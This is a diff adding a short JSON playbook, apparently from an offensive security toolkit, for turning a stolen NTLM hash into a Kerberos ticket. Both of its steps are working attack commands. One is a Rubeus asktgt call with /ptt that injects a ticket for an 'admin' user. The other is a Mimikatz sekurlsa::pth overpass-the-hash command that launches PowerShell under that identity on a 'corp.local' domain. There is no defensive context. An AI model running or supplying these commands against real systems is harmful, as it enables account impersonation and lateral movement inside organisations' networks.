@@ -1,0 +1,19 @@
+{
+	"name": "NTLM to Kerberos Ticket Conversion",
+	"description": "Upgrade an NTLM hash to a usable Kerberos TGT.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Rubeus TGT Request",
+			"command": "Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt",
+			"description": "Obtain and inject TGT."
+		},
+		{
+			"index": 2,
+			"name": "Mimikatz Over-PtH",
+			"command": "sekurlsa::pth /user:admin /domain:corp.local /ntlm:NTLMHASH /run:powershell.exe",
+			"description": "Spawn process under new token."
+		}
+	]
+}
